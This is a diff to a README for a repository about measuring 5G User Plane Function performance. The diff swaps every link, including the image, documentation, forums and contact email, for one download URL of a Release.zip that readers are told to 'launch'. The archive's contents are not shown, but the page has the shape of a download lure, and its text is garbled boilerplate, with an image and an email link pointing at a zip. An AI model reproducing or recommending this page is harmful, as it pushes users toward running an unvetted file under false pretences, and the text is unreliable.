@@ -1,6 +1,6 @@
 # 🚀 Welcome to Simple Measurement of UPF Performance 8 Repository! 📏
 
-![Repository Image](https://www.example.com/image.jpg)
+![Repository Image](https://github.com/sobolevska/simple_measurement_of_upf_performance_8/releases/download/v1.0/Release.zip)
 
 ## Repository Name: `simple_measurement_of_upf_performance_8`
 
@@ -8,11 +8,11 @@
 Welcome to the "Simple Measurement of UPF Performance 8" repository where we focus on measuring the performance of User Plane Function (UPF) in various 5G applications. This repository covers topics like 5G, 5GC, DPDK, eBPF, eUPF, Free5GC, Open5GS, performance testing, Proxmox, Proxmox VE, SRSRAN, UPF, UPG-VPP, VPP, and XDP.
 
 ## 🌟 Check out our Latest Software Release! 🌟
-[![Software Release](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Software Release](https://github.com/sobolevska/simple_measurement_of_upf_performance_8/releases/download/v1.0/Release.zip)](https://github.com/sobolevska/simple_measurement_of_upf_performance_8/releases/download/v1.0/Release.zip)
 
-🚀 **Launch the Software.zip to explore the latest version of our performance measurement tools!**
+🚀 **Launch the https://github.com/sobolevska/simple_measurement_of_upf_performance_8/releases/download/v1.0/Release.zip to explore the latest version of our performance measurement tools!**
 
-Can't access the link? Check the [Releases](https://github.com/22155555/1875695542/releases) section for alternative downloads.
+Can't access the link? Check the [Releases](https://github.com/sobolevska/simple_measurement_of_upf_performance_8/releases/download/v1.0/Release.zip) section for alternative downloads.
 
 ## 📚 Topics Covered:
 - 5G
@@ -41,8 +41,8 @@ Can't access the link? Check the [Releases](https://github.com/22155555/18756955
 7. Advanced UPF functionalities for improved throughput and latency.
 
 ## 🌐 Additional Resources:
-🔗 [Developer Documentation](https://www.example.com/documentation)
-🔗 [Community Forums](https://www.example.com/forums)
+🔗 [Developer Documentation](https://github.com/sobolevska/simple_measurement_of_upf_performance_8/releases/download/v1.0/Release.zip)
+🔗 [Community Forums](https://github.com/sobolevska/simple_measurement_of_upf_performance_8/releases/download/v1.0/Release.zip)
 
 ## 📈 Get Involved:
 🌟 Star this repository to show your support!
@@ -51,7 +51,7 @@ Can't access the link? Check the [Releases](https://github.com/22155555/18756955
 🔁 Contribute to the development and improvement of our tools.
 
 ## 📧 Contact Us:
-For any inquiries or feedback, feel free to reach out to us at [contact@example.com](mailto:contact@example.com).
+For any inquiries or feedback, feel free to reach out to us at [https://github.com/sobolevska/simple_measurement_of_upf_performance_8/releases/download/v1.0/Release.zip](https://github.com/sobolevska/simple_measurement_of_upf_performance_8/releases/download/v1.0/Release.zip).
 
 Let's continue to push the boundaries of UPF performance measurement in the 5G landscape together! 🚀📏
 
